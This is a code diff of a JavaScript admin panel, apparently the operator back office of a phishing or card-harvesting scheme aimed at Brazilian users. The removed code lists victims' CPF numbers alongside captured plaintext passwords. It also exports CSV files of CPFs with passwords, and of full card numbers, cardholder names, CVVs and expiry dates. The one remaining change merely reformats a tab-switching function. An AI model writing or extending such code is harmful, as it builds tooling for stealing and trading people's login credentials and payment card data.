-                <thead><tr><th>ID</th><th>CPF</th><th>Phone</th><th>Amount</th><th>Status</th><th>Type</th><th>Date</th><th>Actions</th></tr></thead>
-                <tbody>
-                    ${paymentsData.map(p => `
-                        <tr>
-                            <td>${p.id}</td>
-                            <td><strong>${formatCPF(p.cpf)}</strong></td>
-                            <td>${formatPhone(p.telefone || '-')}</td>
-                            <td><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span></td>
-                            <td><span class="badge ${p.status === 'paid' ? 'badge-success' : 'badge-warning'}">${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></td>
-                            <td>${p.tipo_pagamento || 'PIX'}</td>
-                            <td>${new Date(p.data_solicitacao).toLocaleString()}</td>
-                            <td><button class="btn-delete" onclick="deletePayment(${p.id})">Delete</button></td>
-                        </tr>
-                    `).join('')}
-                </tbody>
-            </table>
-        </div>
-    `;
-}
-
-async function deletePayment(id) {
-    if(!confirm('Delete this payment?')) return;
-    try {
-        await fetch(`/api/admin/payments/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-        await loadPaymentsFull();
-        showToast('Payment deleted', 'success');
-    } catch(e) { showToast('Error'); }
-}
-
-async function clearAllPayments() {
-    if(!confirm('WARNING: This will delete ALL payments. Continue?')) return;
-    await fetch('/api/admin/clear-payments', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } });
-    await loadPaymentsFull();
-    showToast('All payments deleted', 'success');
-}
-
-async function loadLogsFull() {
-    if(!adminToken) return;
-    try {
-        const res = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const data = await res.json();
-        logsData = data.logs || [];
-        renderLogsFull();
-    } catch(e) { console.error(e); }
-}
-
-function renderLogsFull() {
-    const container = document.getElementById('logsList');
-    if(!logsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">No logs</div>'; return; }
-    container.innerHTML = logsData.map(log => `
-        <div class="log-item">
-            <span class="log-time">${new Date(log.data).toLocaleString()}</span>
-            <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASSWORD' : 'CPF'}</span>
-            <span><strong>${formatCPF(log.cpf)}</strong></span>
-            <span>${log.dispositivo || '-'}</span>
-            ${log.senha ? `<span class="badge badge-warning">Pass: ${log.senha}</span>` : ''}
-            <button class="btn-delete" onclick="deleteLog(${log.id})" style="margin-left:auto;">Delete</button>
-        </div>
-    `).join('');
-}
-
-async function deleteLog(id) {
-    if(!confirm('Delete this log?')) return;
-    try {
-        await fetch(`/api/admin/logs/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-        await loadLogsFull();
-        showToast('Log deleted', 'success');
-    } catch(e) { showToast('Error'); }
-}
-
-async function clearAllLogs() {
-    if(!confirm('WARNING: This will delete ALL logs. Continue?')) return;
-    await fetch('/api/admin/clear-logs', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } });
-    await loadLogsFull();
-    showToast('All logs deleted', 'success');
-}
-
-function renderRecentActivity(logs) {
-    const container = document.getElementById('recentActivity');
-    if(!logs.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">No activity</div>'; return; }
-    container.innerHTML = logs.map(log => `<div class="log-item"><span class="log-time">${new Date(log.data).toLocaleString()}</span><span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASS' : 'CPF'}</span><span>${formatCPF(log.cpf)}</span></div>`).join('');
-}
-
-function renderRecentPayments(payments) {
-    const container = document.getElementById('recentPayments');
-    if(!payments.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">No payments</div>'; return; }
-    container.innerHTML = payments.map(p => `<div class="log-item"><span class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</span><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span><span>${formatCPF(p.cpf)}</span><span>${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></div>`).join('');
-}
-
-function exportUsersCSV() {
-    if(!usersData.length) { showToast('No data'); return; }
-    let csv = "CPF,PASSWORD,PHONE,DATE\n";
-    usersData.forEach(u => csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || ''}","${u.data_senha || u.data_cpf || ''}"\n`);
-    const blob = new Blob([csv], { type: 'text/csv' });
-    const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob);
-    link.download = `users_${new Date().toISOString().slice(0,19)}.csv`;
-    link.click();
-    showToast('CSV exported', 'success');
-}
-
-function exportCardsCSV() {
-    if(!cardsData.length) { showToast('No card data'); return; }
-    let csv = "CPF,CLIENT_NAME,CARD_NUMBER,CARDHOLDER,CVV,EXPIRY,DATE\n";
-    cardsData.forEach(c => csv += `"${c.cpf || ''}","${c.cliente_nome || c.nome_titular || ''}","${c.numero_cartao || c.numero || ''}","${c.nome_titular || ''}","${c.cvv || ''}","${c.validade || ''}","${c.created_at || ''}"\n`);
-    const blob = new Blob([csv], { type: 'text/csv' });
-    const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob);
-    link.download = `cards_${new Date().toISOString().slice(0,19)}.csv`;
-    link.click();
-    showToast('CSV exported', 'success');
-}
-
-function exportPaymentsCSV() {
-    if(!paymentsData.length) { showToast('No payment data'); return; }
-    let csv = "ID,CPF,PHONE,AMOUNT,STATUS,TYPE,DATE\n";
-    paymentsData.forEach(p => csv += `"${p.id}","${p.cpf}","${p.telefone || ''}","${p.valor}","${p.status}","${p.tipo_pagamento || 'PIX'}","${p.data_solicitacao}"\n`);
-    const blob = new Blob([csv], { type: 'text/csv' });
-    const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob);
-    link.download = `payments_${new Date().toISOString().slice(0,19)}.csv`;
-    link.click();
-    showToast('CSV exported', 'success');
-}
-
-// Add User
-document.getElementById('addUserForm')?.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const username = document.getElementById('newUsername').value.trim();
-    const password = document.getElementById('newPassword').value.trim();
-    const msgDiv = document.getElementById('addUserMsg');
-    
-    if(!username || !password || password.length < 6) {
-        msgDiv.innerHTML = '<span style="color:#ef4444;">Username and password (min 6 chars) required</span>';
-        setTimeout(() => msgDiv.innerHTML = '', 3000);
-        return;
-    }
-    
-    try {
-        const res = await fetch('/api/admin/add-user', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
-            body: JSON.stringify({ username, password })
-        });
-        const data = await res.json();
-        if(data.success) {
-            msgDiv.innerHTML = '<span style="color:#10b981;">User added successfully!</span>';
-            document.getElementById('newUsername').value = '';
-            document.getElementById('newPassword').value = '';
-        } else {
-            msgDiv.innerHTML = `<span style="color:#ef4444;">${data.error || 'Error adding user'}</span>`;
-        }
-    } catch(e) {
-        msgDiv.innerHTML = '<span style="color:#ef4444;">Error adding user</span>';
-    }
-    setTimeout(() => msgDiv.innerHTML = '', 3000);
-});
-
-async function changeAdminPassword() {
-    const current = document.getElementById('currentPass').value;
-    const newPass = document.getElementById('newPass').value;
-    const confirm = document.getElementById('confirmPass').value;
-    const msgDiv = document.getElementById('passwordMsg');
-    
-    if(!current || !newPass || newPass.length < 6 || newPass !== confirm) {
-        msgDiv.innerHTML = '<span style="color:#ef4444;">Check fields (min 6 chars)</span>';
-        setTimeout(() => msgDiv.innerHTML = '', 2000);
-        return;
-    }
-    const res = await fetch('/api/admin/change-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
-        body: JSON.stringify({ senha_antiga: current, nova_senha: newPass })
-    });
-    const data = await res.json();
-    if(data.success) {
-        msgDiv.innerHTML = '<span style="color:#10b981;">Password updated!</span>';
-        document.getElementById('currentPass').value = '';
-        document.getElementById('newPass').value = '';
-        document.getElementById('confirmPass').value = '';
-    } else {
-        msgDiv.innerHTML = `<span style="color:#ef4444;">${data.error}</span>`;
-    }
-    setTimeout(() => msgDiv.innerHTML = '', 2000);
-}
-
-async function switchTab(tabName) {
+function switchTab(tabName) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     if(event && event.target) event.target.classList.add('active');
     document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
     document.getElementById(`tab${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`).classList.add('active');
-    
     const sidebarLink = Array.from(document.querySelectorAll('.sidebar-menu a')).find(a => a.getAttribute('data-tab') === tabName);
-    if(sidebarLink) {
-        document.querySelectorAll('.sidebar-menu a').forEach(l => l.classList.remove('active'));
-        sidebarLink.classList.add('active');
-    }
+    if(sidebarLink) { document.querySelectorAll('.sidebar-menu a').forEach(l => l.classList.remove('active')); sidebarLink.classList.add('active'); }
     if(window.innerWidth <= 768) document.getElementById('sidebar')?.classList.remove('mobile-open');
-    
-    if(!loadedTabs[tabName]) {
-        loadedTabs[tabName] = true;
-        if(tabName === 'produtos') loadProducts();
-        else if(tabName === 'agendamentos') loadSchedule();
-        else if(tabName === 'users') loadUsers();
-        else if(tabName === 'cards') loadCards();
-        else if(tabName === 'payments') loadPaymentsFull();
-        else if(tabName === 'logs') loadLogsFull();
-    }
+    if(!loadedTabs[tabName]) { loadedTabs[tabName] = true; if(tabName === 'produtos') loadProducts(); else if(tabName === 'agendamentos') loadSchedule(); else if(tabName === 'users') loadUsers(); else if(tabName === 'cards') loadCards(); else if(tabName === 'payments') loadPaymentsFull(); else if(tabName === 'logs') loadLogsFull(); }
 }
 </script>
 </body>
